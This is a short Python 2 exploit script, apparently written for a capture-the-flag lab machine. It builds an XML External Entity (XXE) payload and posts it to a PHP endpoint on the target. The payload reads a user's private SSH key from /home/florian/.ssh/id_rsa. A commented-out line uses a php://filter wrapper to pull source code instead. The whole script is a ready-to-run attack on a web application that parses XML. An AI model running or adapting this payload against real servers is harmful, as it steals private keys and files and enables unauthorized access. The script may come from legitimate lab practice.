import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>

victim_ip = '10.10.10.78'
victim_php = 'hosts.php'

#string = 'php://filter/convert.base64-encode/resource=http://' + victim_ip +'/' + victim_php
string = 'file:////home/florian/.ssh/id_rsa'
print string

def build_xml(string):
	xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
	xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
	xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
	xml = xml + "\r\n" + """<details>"""
	xml = xml + "\r\n" + """    <subnet_mask>&xxe;</subnet_mask>"""
	xml = xml + "\r\n" + """    <test></test>"""
	xml = xml + "\r\n" + """</details>"""
	print "XML = %s" % xml
	send_xml(xml)

def send_xml(xml):
	headers = {'Content-Type': 'application/xml'}
	response = requests.post('http://' + victim_ip + '/' + victim_php , data=xml, headers=headers, timeout=5).text
	print response



build_xml(string)

